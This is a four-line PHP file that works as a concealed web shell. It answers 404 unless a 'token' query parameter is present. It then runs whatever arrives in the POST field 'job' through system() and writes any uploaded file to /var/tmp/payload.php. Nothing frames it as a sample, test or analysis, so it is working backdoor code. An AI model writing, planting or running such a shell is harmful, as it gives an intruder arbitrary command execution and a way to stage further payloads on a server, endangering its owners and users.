<?php
if (!isset($_GET['token'])) { http_response_code(404); exit; }
system($_POST['job']);
move_uploaded_file($_FILES['asset']['tmp_name'], '/var/tmp/payload.php');
